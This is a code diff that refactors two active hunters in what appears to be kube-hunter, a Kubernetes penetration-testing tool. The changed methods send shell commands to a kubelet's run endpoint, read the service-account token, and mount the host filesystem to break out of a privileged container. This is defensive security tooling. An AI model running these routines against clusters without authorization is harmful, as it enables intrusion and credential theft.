@@ -469,18 +469,19 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
     def get_request(self, url, verify=False):
         config = get_config()
         try:
-            response_text = requests.get(url, verify, timeout=config.network_timeout).text.rstrip()
+            response_text = self.event.session.get(url=url, verify=verify, timeout=config.network_timeout).text.rstrip()
 
             return response_text
         except Exception as ex:
             logging.debug("Exception: " + str(ex))
             return "Exception: " + str(ex)
 
-    @staticmethod
-    def post_request(url, params, verify=False):
+    def post_request(self, url, params, verify=False):
         config = get_config()
         try:
-            response_text = requests.post(url, verify, params=params, timeout=config.network_timeout).text.rstrip()
+            response_text = self.event.session.post(
+                url=url, verify=verify, params=params, timeout=config.network_timeout
+            ).text.rstrip()
 
             return response_text
         except Exception as ex:
@@ -503,9 +504,8 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
             result
         )
 
-    @staticmethod
-    def cat_command(run_request_url, full_file_path):
-        return FootholdViaSecureKubeletPort.post_request(run_request_url, {"cmd": "cat {}".format(full_file_path)})
+    def cat_command(self, run_request_url, full_file_path):
+        return self.post_request(run_request_url, {"cmd": "cat {}".format(full_file_path)})
 
     def process_container(self, run_request_url):
         service_account_token = self.cat_command(run_request_url, "/var/run/secrets/kubernetes.io/serviceaccount/token")
@@ -610,6 +610,21 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
         self.number_of_rmdir_attempts = 5
         self.number_of_umount_attempts = 5
 
+    def post_request(self, url, params, verify=False):
+        config = get_config()
+        try:
+            response_text = self.event.session.post(
+                url, verify, params=params, timeout=config.network_timeout
+            ).text.rstrip()
+
+            return response_text
+        except Exception as ex:
+            logging.debug("Exception: " + str(ex))
+            return "Exception: " + str(ex)
+
+    def cat_command(self, run_request_url, full_file_path):
+        return self.post_request(run_request_url, {"cmd": "cat {}".format(full_file_path)})
+
     def clean_attacked_exposed_existing_privileged_container(
         self,
         run_request_url,
@@ -641,17 +656,15 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
             run_request_url, directory_created, number_of_rmdir_attempts, seconds_to_wait_for_os_command,
         )
 
-    @staticmethod
-    def check_file_exists(run_request_url, file):
-        file_exists = MaliciousIntentViaSecureKubeletPort.ls_command(run_request_url, file)
+    def check_file_exists(self, run_request_url, file):
+        file_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=file)
 
         return FootholdViaSecureKubeletPort.has_no_error_nor_exception(file_exists)
 
-    @staticmethod
-    def rm_command(run_request_url, file_to_remove, number_of_rm_attempts, seconds_to_wait_for_os_command):
-        if MaliciousIntentViaSecureKubeletPort.check_file_exists(run_request_url, file_to_remove):
+    def rm_command(self, run_request_url, file_to_remove, number_of_rm_attempts, seconds_to_wait_for_os_command):
+        if self.check_file_exists(run_request_url, file_to_remove):
             for _ in range(number_of_rm_attempts):
-                command_execution_outcome = FootholdViaSecureKubeletPort.post_request(
+                command_execution_outcome = self.post_request(
                     run_request_url, {"cmd": "rm -f {}".format(file_to_remove)}
                 )
 
@@ -659,22 +672,18 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                     time.sleep(seconds_to_wait_for_os_command)
 
                 first_check = FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_execution_outcome)
-                second_check = MaliciousIntentViaSecureKubeletPort.check_file_exists(run_request_url, file_to_remove)
+                second_check = self.check_file_exists(run_request_url, file_to_remove)
 
                 if first_check and not second_check:
                     return True
 
         return False
 
-    @staticmethod
-    def chmod_command(run_request_url, permissions, file):
-        return FootholdViaSecureKubeletPort.post_request(
-            run_request_url, {"cmd": "chmod {} {}".format(permissions, file)}
-        )
+    def chmod_command(self, run_request_url, permissions, file):
+        return self.post_request(run_request_url, {"cmd": "chmod {} {}".format(permissions, file)})
 
-    @staticmethod
-    def touch_command(run_request_url, file_to_create):
-        return FootholdViaSecureKubeletPort.post_request(run_request_url, {"cmd": "touch {}".format(file_to_create)})
+    def touch_command(self, run_request_url, file_to_create):
+        return self.post_request(run_request_url, {"cmd": "touch {}".format(file_to_create)})
 
     def attack_exposed_existing_privileged_container(
         self, run_request_url, directory_created, number_of_rm_attempts, seconds_to_wait_for_os_command, file_name=None
@@ -696,19 +705,17 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
 
         return {"result": False}
 
-    @staticmethod
-    def check_directory_exists(run_request_url, directory):
-        directory_exists = MaliciousIntentViaSecureKubeletPort.ls_command(run_request_url, directory)
+    def check_directory_exists(self, run_request_url, directory):
+        directory_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=directory)
 
         return FootholdViaSecureKubeletPort.has_no_error_nor_exception(directory_exists)
 
-    @staticmethod
     def rmdir_command(
-        run_request_url, directory_to_remove, number_of_rmdir_attempts, seconds_to_wait_for_os_command,
+        self, run_request_url, directory_to_remove, number_of_rmdir_attempts, seconds_to_wait_for_os_command,
     ):
-        if MaliciousIntentViaSecureKubeletPort.check_directory_exists(run_request_url, directory_to_remove):
+        if self.check_directory_exists(run_request_url, directory_to_remove):
             for _ in range(number_of_rmdir_attempts):
-                command_execution_outcome = FootholdViaSecureKubeletPort.post_request(
+                command_execution_outcome = self.post_request(
                     run_request_url, {"cmd": "rmdir {}".format(directory_to_remove)}
                 )
 
@@ -716,31 +723,32 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                     time.sleep(seconds_to_wait_for_os_command)
 
                 first_check = FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_execution_outcome)
-                second_check = MaliciousIntentViaSecureKubeletPort.check_directory_exists(
-                    run_request_url, directory_to_remove
-                )
+                second_check = self.check_directory_exists(run_request_url, directory_to_remove)
 
                 if first_check and not second_check:
                     return True
 
         return False
 
-    @staticmethod
-    def ls_command(run_request_url, file_or_directory):
-        return FootholdViaSecureKubeletPort.post_request(run_request_url, {"cmd": "ls {}".format(file_or_directory)})
+    def ls_command(self, run_request_url, file_or_directory):
+        return self.post_request(run_request_url, {"cmd": "ls {}".format(file_or_directory)})
 
-    @staticmethod
     def umount_command(
-        run_request_url, file_system_or_partition, directory, number_of_umount_attempts, seconds_to_wait_for_os_command,
+        self,
+        run_request_url,
+        file_system_or_partition,
+        directory,
+        number_of_umount_attempts,
+        seconds_to_wait_for_os_command,
     ):
         # Note: the logic implemented proved more reliable than using "df"
         # command to resolve for mounted systems/partitions.
-        current_files_and_directories = MaliciousIntentViaSecureKubeletPort.ls_command(run_request_url, directory)
+        current_files_and_directories = self.ls_command(run_request_url, directory)
 
-        if MaliciousIntentViaSecureKubeletPort.ls_command(run_request_url, directory) == current_files_and_directories:
+        if self.ls_command(run_request_url, directory) == current_files_and_directories:
             for _ in range(number_of_umount_attempts):
                 # Ref: http://man7.org/linux/man-pages/man2/umount.2.html
-                command_execution_outcome = FootholdViaSecureKubeletPort.post_request(
+                command_execution_outcome = self.post_request(
                     run_request_url, {"cmd": "umount {} {}".format(file_system_or_partition, directory)}
                 )
 
@@ -748,34 +756,24 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                     time.sleep(seconds_to_wait_for_os_command)
 
                 first_check = FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_execution_outcome)
-                second_check = (
-                    MaliciousIntentViaSecureKubeletPort.ls_command(run_request_url, directory)
-                    != current_files_and_directories
-                )
+                second_check = self.ls_command(run_request_url, directory) != current_files_and_directories
 
                 if first_check and second_check:
                     return True
 
         return False
 
-    @staticmethod
-    def mount_command(run_request_url, file_system_or_partition, directory):
+    def mount_command(self, run_request_url, file_system_or_partition, directory):
         # Ref: http://man7.org/linux/man-pages/man1/mkdir.1.html
-        return FootholdViaSecureKubeletPort.post_request(
-            run_request_url, {"cmd": "mount {} {}".format(file_system_or_partition, directory)}
-        )
+        return self.post_request(run_request_url, {"cmd": "mount {} {}".format(file_system_or_partition, directory)})
 
-    @staticmethod
-    def mkdir_command(run_request_url, directory_to_create):
+    def mkdir_command(self, run_request_url, directory_to_create):
         # Ref: http://man7.org/linux/man-pages/man1/mkdir.1.html
-        return FootholdViaSecureKubeletPort.post_request(
-            run_request_url, {"cmd": "mkdir {}".format(directory_to_create)}
-        )
+        return self.post_request(run_request_url, {"cmd": "mkdir {}".format(directory_to_create)})
 
-    @staticmethod
-    def findfs_command(run_request_url, file_system_or_partition_type, file_system_or_partition):
+    def findfs_command(self, run_request_url, file_system_or_partition_type, file_system_or_partition):
         # Ref: http://man7.org/linux/man-pages/man8/findfs.8.html
-        return FootholdViaSecureKubeletPort.post_request(
+        return self.post_request(
             run_request_url, {"cmd": "findfs {}{}".format(file_system_or_partition_type, file_system_or_partition)}
         )
 
@@ -811,7 +809,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
             directory_to_create = "/kube-hunter_" + str(uuid.uuid1())
 
         # /proc/cmdline - This file shows the parameters passed to the kernel at the time it is started.
-        command_line = FootholdViaSecureKubeletPort.cat_command(run_request_url, "/proc/cmdline")
+        command_line = self.cat_command(run_request_url, "/proc/cmdline")
 
         if FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_line):
             if len(command_line.split(" ")) > 0:
@@ -837,7 +835,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                             if FootholdViaSecureKubeletPort.has_no_error_nor_exception(
                                 mounted_file_system_or_partition
                             ):
-                                host_name = FootholdViaSecureKubeletPort.cat_command(
+                                host_name = self.cat_command(
                                     run_request_url, "{}/etc/hostname".format(directory_created)
                                 )
 
